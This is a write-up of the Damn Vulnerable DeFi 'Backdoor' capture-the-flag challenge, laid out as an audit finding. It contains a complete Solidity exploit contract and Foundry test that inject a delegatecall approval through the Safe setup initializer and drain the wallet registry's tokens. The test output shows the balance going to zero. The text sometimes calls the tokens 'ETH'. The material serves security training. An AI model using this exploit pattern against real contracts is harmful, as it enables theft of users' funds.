# Damn Vulnerable Defi - Backdoor
- Scope
    - WalletRegistry.sol
    - SafeProxyFactory.sol
    - Safe.sol
    - SafeProxy.sol
    - IProxyCreationCallback.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Malicious calldata injected to approve ETH transfer during Proxy creation

### Summary
Malicious calldata can be injected to approve ETH transfer during Proxy creation, allowing another user to transfer ETH out of the proxy.

### Vulnerability Details
The data provided during Proxy creation can be malicious as there is no verification. Such as creating a backdoor to approve and transfer token.

### Impact/Proof of Concept
1. Create malicious data to approve of transferring ETH
2. Provide the malicious data during Proxy creation which will approve
3. With the approved ETH, we can perform transferFrom and drain from the Proxy
```
function test_backdoor() public checkSolvedByPlayer {
        console.log("beforeBalance: ", token.balanceOf(address(walletRegistry)));
        Exploit exploit = new Exploit(address(singletonCopy),address(walletFactory),address(walletRegistry),address(token),recovery);
        exploit.attack(users);
        console.log("afterBalance: ", token.balanceOf(address(walletRegistry)));
    }

contract Exploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;
    
    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
         singletonCopy,  // _singleton => Address of singleton contract.
         _initializer,   // initializer => Payload for message call sent to new proxy contract.
         i,              // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
         IProxyCreationCallback(walletRegistry)  // callback => Cast walletRegistry to IProxyCreationCallback
);
            //Transfer to caller
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
```

Results
```diff
[PASS] test_backdoor() (gas: 1742197)
Logs:
  beforeBalance:  40000000000000000000
  afterBalance:  0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.55ms (1.46ms CPU time)
```

